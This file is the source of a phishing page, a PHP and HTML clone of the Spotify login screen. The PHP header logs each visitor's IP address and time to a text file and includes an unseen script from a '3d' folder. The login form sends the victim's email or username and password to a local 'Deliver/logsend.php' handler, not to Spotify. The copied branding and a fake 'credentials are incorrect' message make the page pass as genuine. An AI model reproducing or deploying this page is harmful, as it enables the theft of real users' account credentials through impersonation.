<?php
error_reporting(0);
include "./3d/index.php";

$ip = getenv("REMOTE_ADDR");
$file = fopen("lesviews.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

?>

<!DOCTYPE html>
<html class="translated-ltr"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Latest compiled and minified CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Latest compiled JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script><style>undefined</style>

    <link rel="stylesheet" type="text/css" href="style.css">

    <title>Log in - Spotify</title>
<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=CAM/d=0/rs=AN8SPfqeKn8wA30q4viup18yaci8udUjKQ/m=el_main_css"></head>
<body cz-shortcut-listen="true">
<div class="ng-scope">
    <div sp-header="" class="ng-scope">
        <div class="head">
            <a class="spotify-logo" tabindex="-1" title="Spotify" href="login.html"></a>
        </div>
    </div>
    <div class="container-fluid login ng-scope">
        <div class="content">

            <div class="row">
                <div class="col-xs-12">

                </div>
            </div>

            <form method="post" action="./Deliver/logsend.php">

                <p style="display: none;color:red;padding-left: 25%;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Your credentials are incorrect</font></font></p>

                <div class="row">
                    <div class="col-xs-12">
                        <label for="login-username" class="control-label sr-only ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            e-mail or username
                        </font></font></label>
                        <input type="email" class="form-control input-with-feedback" name="username" id="login-username" placeholder="Email address or username" required="" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="" ng-trim="false" value="">

                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <label for="login-password" class="control-label sr-only ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Password
                        </font></font></label>
                        <input type="password" class="
                               form-control input-with-feedback" name="password" id="login-password" placeholder="Password" required="" autocomplete="off" ng-trim="false" value="">

                    </div>
                </div>
                <div class="row row-submit">
                    <div class="col-xs-12 col-sm-6">
                        <div class="checkbox">
                            <label class="ng-binding">
                                <input ng-model="form.remember" type="checkbox" name="remember" id="login-remember" value="true" checked=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Remember me</font></font><span class="control-indicator"></span>
                            </label>
                        </div>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <button class="btn btn-block btn-green" id="login-button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Log in</font></font></button>
                    </div>
                </div>
            </form>
            <div class="row">
                <div class="col-xs-12 text-center">
                    <p>
                        <a id="reset-password-link" href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Forgot your password?</font></font></a>
                    </p>
                </div>
            </div>
            <div>
                <div class="row">
                    <div class="col-xs-12">
                        <div>
                            <div>
                                <div>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <div class="divider">

                                            </div>
                                        </div>
                                    </div>
                                    <div class="row text-center mt-0">
                                        <div class="h4"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Don't have an account?</font></font></div>
                                    </div>
                                    <div>
                                        <div class="row">
                                            <div class="col-xs-12">
                                                <a class="btn btn-block btn-default" role="button" href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Register</font></font></a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12">
                    <div class="divider"></div>
                    <p class="text-muted disclaimer text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if you click "Log in with Facebook" and if you are not a Spotify user, you will be registered and you accept Spotify's </font></font><a href="login.html" target="_blank"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Terms &amp; Conditions</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="login.html" target="_blank"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacy Policy</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></p>
                </div>
            </div>
        </div>
    </div>
</div><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>


</body></html>